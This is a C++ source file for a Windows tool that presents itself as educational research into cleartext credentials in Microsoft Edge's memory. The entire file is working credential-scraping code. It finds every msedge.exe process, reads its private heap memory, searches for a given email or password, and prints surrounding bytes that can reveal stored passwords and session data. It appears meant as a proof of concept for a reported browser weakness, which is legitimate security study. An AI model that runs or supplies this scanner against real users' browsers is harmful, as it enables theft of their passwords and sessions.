/**
 * ===============================================================
 * Edge Credential Memory Scanner (Educational Security Research)
 * ===============================================================
 *
 * CONTEXT:
 * In early 2026, security researchers identified that Microsoft Edge (and other
 * Chromium-based browsers) may store sensitive data, including password vault
 * entries and session cookies, in plaintext within the process heap (MEM_PRIVATE).
 * While modern Windows OS provides process isolation, any process running with
 * the same user privileges (like this tool) can utilize NtReadVirtualMemory
 * (via ReadProcessMemory) to scrape these credentials.
 *
 * REFERENCE:
 * https://isc.sans.edu/diary/Cleartext+Passwords+in+MS+Edge+In+2026/32954
 *
 * FUNCTIONALITY:
 * 1. Takes a process name (e.g., msedge.exe) and an optional search term.
 * 2. Iterates through all running processes using ToolHelp32 snapshots.
 * 3. For every matching process, it scans committed private read/write memory.
 * 4. Utilizes the C++17 Boyer-Moore-Horspool algorithm for high-performance searching.
 * 5. Uses fast_io for optimized I/O operations and memory-safe buffer handling.
 *
 * USAGE:
 *   scanpass.exe msedge.exe "your_email@outlook.com"
 *   scanpass.exe msedge.exe "your_known_password"
 *
 * ======================================================================================
 */

#define NOMINMAX 1
#define _WIN32_LEAN_AND_MEAN 1
#include <windows.h>
#include <tlhelp32.h>
#include <fast_io.h>
#include <fast_io_dsal/vector.h>
#include <fast_io_dsal/string.h>
#include <fast_io_dsal/string_view.h>
#include <algorithm>
#include <functional> // Required for Boyer-Moore

/**
 * Prints a sanitized snippet of memory around a discovered match.
 */
template <typename T>
inline void PrintSnippet(T &outstm, ::fast_io::string_view buffer, size_t offset, size_t contextSize = 100)
{
	using namespace ::fast_io::io;
	size_t start = (offset > contextSize) ? offset - contextSize : 0;
	size_t end = (offset + contextSize < buffer.size()) ? offset + contextSize : buffer.size();

	print(outstm, "    Snippet: [");
	for (size_t i = start; i < end; ++i)
	{
		if (i == offset)
		{
			print(outstm, " >>"); // Highlight start of match
		}

		// Print printable ASCII, otherwise use a placeholder
		auto chval{static_cast<char8_t>(buffer[i])};
		print(outstm, ::fast_io::mnp::chvw(::fast_io::char_category::is_c_graph(chval) ? chval : u8'.'));

		if (i == offset + contextSize / 2)
		{
			print(outstm, "<< ");
		}
	}
	print(outstm, "]\n");
}

template <typename T>
inline void ScanProcessMemory(T &outstm, DWORD pid, ::fast_io::string_view target)
{
	using namespace ::fast_io::io;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (!hProcess)
	{
		::fast_io::throw_win32_error();
	}
	::fast_io::win32_file hprocessfile(hProcess);

	SYSTEM_INFO si;
	GetSystemInfo(__builtin_addressof(si));

	MEMORY_BASIC_INFORMATION mbi;
	unsigned char *addr = (unsigned char *)si.lpMinimumApplicationAddress;
	// Pre-initialize the Boyer-Moore searcher if a target is provided
	::std::boyer_moore_horspool_searcher searcher(target.cbegin(), target.cend());

	print(outstm, "[+] Scanning PID ", pid, "...\n");

	while (addr < (unsigned char *)si.lpMaximumApplicationAddress)
	{
		if (VirtualQueryEx(hProcess, addr, ::std::addressof(mbi), sizeof(mbi)) == sizeof(mbi))
		{
			// We search MEM_PRIVATE & PAGE_READWRITE because that's where
			// heap data (passwords/strings) usually resides.
			bool isDataRegion = (mbi.State == MEM_COMMIT) &&
								(mbi.Protect & PAGE_READWRITE) &&
								(mbi.Type == MEM_PRIVATE);

			if (isDataRegion && !target.is_empty())
			{
				::fast_io::vector<char> buffer(mbi.RegionSize, ::fast_io::for_overwrite);
				SIZE_T bytesRead;

				if (ReadProcessMemory(hProcess, addr, buffer.data(), mbi.RegionSize, __builtin_addressof(bytesRead)))
				{
					auto it = std::search(buffer.begin(), buffer.begin() + bytesRead, searcher);

					while (it != (buffer.begin() + bytesRead))
					{
						size_t offset = std::distance(buffer.begin(), it);
						println(outstm, "[!] Match found at 0x",
								::fast_io::mnp::pointervw(addr + offset));
						PrintSnippet(outstm, ::fast_io::string_view(buffer.data(), buffer.size()), offset);

						// Continue searching in the same block
						it = std::search(it + target.size(), buffer.begin() + bytesRead, searcher);
					}
				}
			}
			addr += mbi.RegionSize;
		}
		else
		{
			break;
		}
	}

	print(outstm, "[+] Scan finished.\n");
}

inline void FindAndScanProcesses(auto &obf, ::fast_io::u16cstring_view processName, ::fast_io::string_view target)
{
	using namespace ::fast_io::io;

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		::fast_io::throw_win32_error();
	}
	::fast_io::win32_file snap_file(hSnap);

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hSnap, &pe32))
	{
		return;
	}

	do
	{
		// Convert WCHAR to a comparable format
		::fast_io::u16string_view current_name(::fast_io::mnp::os_c_str(reinterpret_cast<char16_t const *>(pe32.szExeFile), processName.size()));

		// Use a wide search or conversion if necessary; here we do a simple match
		// Note: For Edge, you'll see many "msedge.exe" entries
		if (current_name == processName)
		{
			try
			{
				ScanProcessMemory(obf, pe32.th32ProcessID, target);
			}
			catch (::fast_io::error e)
			{
				println(obf, "[-] Failed: ", e);
			}
		}
	} while (Process32NextW(hSnap, &pe32));
}

int main(int argc, char *argv[])
{
	using namespace ::fast_io::io;
	if (argc < 2)
	{
		if (argc == 0)
		{
			return 1;
		}
		perr("Usage: ", ::fast_io::mnp::os_c_str(*argv), " <Process Name> [search_term]\n");
		return 1;
	}

	try
	{
		::fast_io::out_buf_type obf(::fast_io::out());
		::fast_io::string_view procName(::fast_io::mnp::os_c_str(argv[1]));
		::fast_io::string_view searchTerm(::fast_io::mnp::os_c_str((argc >= 3) ? argv[2] : ""));

		println(obf, "[*] Searching for all instances of: ", procName);
		::fast_io::u16string uProcName(::fast_io::u16concat_fast_io(::fast_io::mnp::code_cvt(procName)));
		FindAndScanProcesses(obf, ::fast_io::u16cstring_view(uProcName), searchTerm);
		println(obf, "[*] All scans complete.");
	}
	catch (::fast_io::error e)
	{
		perrln(e);
		return 1;
	}
}